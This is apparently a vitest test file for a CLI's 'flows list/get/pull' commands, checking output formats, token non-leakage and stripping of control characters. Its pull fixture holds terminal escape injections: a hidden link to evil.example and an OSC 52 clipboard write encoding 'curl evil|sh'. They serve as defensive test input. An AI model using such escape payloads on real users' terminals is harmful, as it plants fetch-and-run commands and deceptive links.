import { randomBytes } from "node:crypto";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { envelope, routedFetch, type Answer, type FakeFetch } from "../../tests/fake-fetch.js";
import { runCli, type CliRun } from "../../tests/run-cli.js";
import { deleteCredentials, saveCredentials } from "../credentials.js";
import { NO_FLOWS_MESSAGE } from "./flows.js";

/*
 * telflo flows list|get|pull against a stand-in API, with the public API's
 * names: `authorName`, `distribution`, `collectorVersion`, `sourceUrl`.
 * Tokens are made at run time and checked as booleans only.
 */

const SERVER = "https://telflo.example";
const ORGANIZATION = "0b7e8a9c-1d2e-4f30-8a4b-5c6d7e8f9a0b";

const FLOW = {
  id: "3e0b1cdf-4a5b-4c63-9d7e-8f9a0b1c2d3e",
  slug: "otel-to-clickstack",
  name: "OTel to ClickStack",
  summary: "Ship everything to ClickHouse",
  source: "telflo",
  authorName: null,
  authorUrl: null,
  signals: ["traces", "logs"],
  tags: ["clickhouse"],
  collectorVersion: "2.36.0",
  distribution: "clickstack",
  sourceUrl: null,
  updatedAt: "2026-10-26T12:00:00.000Z",
};

const DETAIL = { ...FLOW, description: "# Why\n\nBecause.\n", yaml: "receivers: {}" };

let token: string;

/** Whether a text holds a control character but the newline. */
function holdsControl(text: string): boolean {
  // eslint-disable-next-line no-control-regex
  return /[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/.test(text);
}

/** Runs the CLI; its output is checked for the token (a boolean) before any test reads it. */
async function cli(...args: Parameters<typeof runCli>): Promise<CliRun> {
  const result = await runCli(...args);
  expect(result.stdout.includes(token) || result.stderr.includes(token)).toBe(false);
  return result;
}
let fake: FakeFetch;

function routes(table: Record<string, Answer>): FakeFetch {
  fake = routedFetch(table);
  vi.stubGlobal("fetch", fake.fetch);
  return fake;
}

beforeEach(() => {
  token = `tf_${randomBytes(32).toString("base64url")}`;
  deleteCredentials();
  saveCredentials({ version: 1, server: SERVER, token, kind: "service_account", tokenName: "ci", organizationId: ORGANIZATION });
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("telflo flows list", () => {
  it("prints the flows with their pin and author", async () => {
    routes({
      "GET /flows": { json: { items: [FLOW, { ...FLOW, slug: "k8s-logs", name: "Kubernetes logs", authorName: "Ada", signals: [] }], nextCursor: null } },
    });
    const result = await cli(["flows", "list"]);
    expect(result.code).toBe(0);
    const lines = result.stdout.split("\n");
    expect(lines[0]).toMatch(/^slug\s+name\s+signals\s+collector\s+by$/);
    expect(lines[2]).toMatch(/^otel-to-clickstack\s+OTel to ClickStack\s+traces,logs\s+clickstack 2\.36\.0\s+Telflo$/);
    expect(lines[3]).toMatch(/^k8s-logs\s+Kubernetes logs\s+clickstack 2\.36\.0\s+Ada$/);
    expect(result.stdout.includes(token) || result.stderr.includes(token)).toBe(false);
  });

  it("prints JSON with --json, and says when there are none", async () => {
    routes({ "GET /flows": { json: { items: [FLOW], nextCursor: null } } });
    expect(JSON.parse((await cli(["--json", "flows", "list"])).stdout)).toEqual([FLOW]);
    routes({ "GET /flows": { json: { items: [], nextCursor: null } } });
    expect((await cli(["flows", "list"])).stdout).toBe(`${NO_FLOWS_MESSAGE}\n`);
  });
});

describe("telflo flows get", () => {
  it("prints the flow, its description, its YAML and how to start from it", async () => {
    routes({ "GET /flows/otel-to-clickstack": { json: DETAIL } });
    const result = await cli(["flows", "get", "otel-to-clickstack"]);
    expect(result.code).toBe(0);
    expect(result.stdout).toBe(
      [
        "OTel to ClickStack (otel-to-clickstack)",
        "Ship everything to ClickHouse",
        "signals: traces, logs   tags: clickhouse",
        "collector: clickstack 2.36.0   by: Telflo",
        "",
        "# Why\n\nBecause.",
        "",
        "--- yaml ---",
        "receivers: {}",
        "",
        'Start from it: telflo flows pull otel-to-clickstack -o config.yaml && telflo config create --name "OTel to ClickStack" -f config.yaml',
        "",
      ].join("\n"),
    );
  });

  it("shows the source, the author and dashes for empty lists; the slug is encoded; a 404 is its words", async () => {
    routes({ "GET /flows/a%20b": { json: { ...DETAIL, slug: "a b", signals: [], tags: [], authorName: "Ada", sourceUrl: "https://example.com/flow" } } });
    const lines = (await cli(["flows", "get", "a b"])).stdout.split("\n");
    expect(lines.slice(2, 5)).toEqual(["signals: -   tags: -", "collector: clickstack 2.36.0   by: Ada", "source: https://example.com/flow"]);
    expect(fake.calls[0]?.url.pathname).toBe("/api/public/v1/flows/a%20b");
    routes({});
    const missing = await cli(["flows", "get", "nope"]);
    expect(missing.code).toBe(1);
    expect(missing.stderr).toBe("error: Not found.\n");
    routes({ "GET /flows/nope": { status: 404, json: envelope("flow_not_found", "Flow not found.") } });
    expect((await cli(["--json", "flows", "get", "nope"])).stderr).toBe(
      `${JSON.stringify({ error: { code: "flow_not_found", message: "Flow not found.", status: 404 } })}\n`,
    );
    routes({ "GET /flows/otel-to-clickstack": { json: DETAIL } });
    expect(JSON.parse((await cli(["--json", "flows", "get", "otel-to-clickstack"])).stdout)).toEqual(DETAIL);
  });

  it("refuses a slug of . or .. (exit 2)", async () => {
    routes({});
    expect((await cli(["flows", "get", ".."])).code).toBe(2);
    expect(fake.calls).toHaveLength(0);
  });
});

describe("server strings in human lines", () => {
  it("strips control characters from get's every line, and pull -o's message; pull keeps the YAML byte for byte", async () => {
    const e = "\u001b[31m\u0007";
    const flow = {
      ...DETAIL,
      name: `n${e}`,
      summary: `s${e}`,
      tags: [`t${e}`],
      authorName: `a${e}`,
      sourceUrl: `u${e}`,
      description: `d1${e}\nd2${e}`,
      yaml: `y1: "${e}"\ny2:\t2\n`,
    };
    routes({ "GET /flows/otel-to-clickstack": { json: flow } });
    const get = await cli(["flows", "get", "otel-to-clickstack"]);
    expect(holdsControl(get.stdout.replaceAll("\t", ""))).toBe(false);
    expect(get.stdout.includes("d1[31m\nd2[31m\n")).toBe(true);
    // Tabs are kept, every other control character goes.
    expect(get.stdout.includes('y1: "[31m"\ny2:\t2\n')).toBe(true);
    const out = join(process.env.HOME!, "escaped.yaml");
    const written = await cli(["flows", "pull", "otel-to-clickstack", "-o", out]);
    expect(holdsControl(written.stdout)).toBe(false);
    expect(readFileSync(out, "utf8") === flow.yaml).toBe(true);
    expect((await cli(["flows", "pull", "otel-to-clickstack"])).stdout === flow.yaml).toBe(true);
  });
});

describe("telflo flows pull", () => {
  const STORED_WITH_ESCAPES = "receivers: {}\n# \u001b[8mhidden\u001b[0m \u001b]8;;https://evil.example\u0007link\u001b]8;;\u0007 \u001b]52;c;Y3VybCBldmlsfHNo\u0007\nexporters:\n\tdebug: {}\n";

  it("prints a flow's YAML to a terminal without its control characters, byte for byte to a pipe", async () => {
    routes({ "GET /flows/otel-to-clickstack": { json: { ...DETAIL, yaml: STORED_WITH_ESCAPES } } });
    const shown = await cli(["flows", "pull", "otel-to-clickstack"], { stdoutTty: true });
    expect(holdsControl(shown.stdout.replaceAll("\t", ""))).toBe(false);
    expect(shown.stdout).toContain("\nexporters:\n\tdebug: {}\n");
    const piped = await cli(["flows", "pull", "otel-to-clickstack"]);
    expect(piped.stdout).toBe(STORED_WITH_ESCAPES);
  });

  it("prints the YAML, ending in a newline", async () => {
    routes({ "GET /flows/otel-to-clickstack": { json: DETAIL } });
    const result = await cli(["flows", "pull", "otel-to-clickstack"]);
    expect(result.stdout).toBe("receivers: {}\n");
    routes({ "GET /flows/otel-to-clickstack": { json: { ...DETAIL, yaml: "receivers: {}\n" } } });
    expect((await cli(["flows", "pull", "otel-to-clickstack"])).stdout).toBe("receivers: {}\n");
  });

  it("writes it to a file with -o, and prints the pin with --json", async () => {
    routes({ "GET /flows/otel-to-clickstack": { json: DETAIL } });
    const out = join(process.env.HOME!, "flow.yaml");
    const written = await cli(["flows", "pull", "otel-to-clickstack", "-o", out]);
    expect(written.code).toBe(0);
    expect(readFileSync(out, "utf8")).toBe("receivers: {}\n");
    expect(written.stdout).toBe(`Wrote otel-to-clickstack to ${out} (validated on clickstack 2.36.0).\n`);
    const json = await cli(["--json", "flows", "pull", "otel-to-clickstack"]);
    expect(JSON.parse(json.stdout)).toEqual({
      slug: "otel-to-clickstack",
      distribution: "clickstack",
      collectorVersion: "2.36.0",
      yaml: "receivers: {}\n",
    });
    const jsonOut = await cli(["--json", "flows", "pull", "otel-to-clickstack", "-o", out]);
    expect(JSON.parse(jsonOut.stdout)).toEqual({ slug: "otel-to-clickstack", distribution: "clickstack", collectorVersion: "2.36.0", out });
  });

  it("exits 3 when not logged in", async () => {
    deleteCredentials();
    routes({});
    expect((await cli(["flows", "pull", "otel-to-clickstack"])).code).toBe(3);
  });
});
